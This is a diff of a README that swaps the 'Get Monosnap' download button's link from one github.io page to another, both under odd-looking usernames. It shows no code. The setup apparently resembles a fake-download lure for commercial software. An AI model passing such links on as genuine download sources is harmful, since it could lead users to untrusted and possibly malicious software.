@@ -21,7 +21,7 @@ To begin using this **Monosnap Screen Capture** and **Monosnap Cloud Uploader**,
 | :--- | :--- |
 | **Get Monosnap Screen Capture** | Click the button below to start using this **Monosnap Video Recorder**. |
 
-[![Button](https://img.shields.io/badge/📸-Get_Monosnap-2ea44f?style=for-the-badge)](https://gorbachyovgermanes.github.io/.github/monosnap-screen-capture)
+[![Button](https://img.shields.io/badge/📸-Get_Monosnap-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/monosnap-screen-capture)
 
 ## System Requirements
 
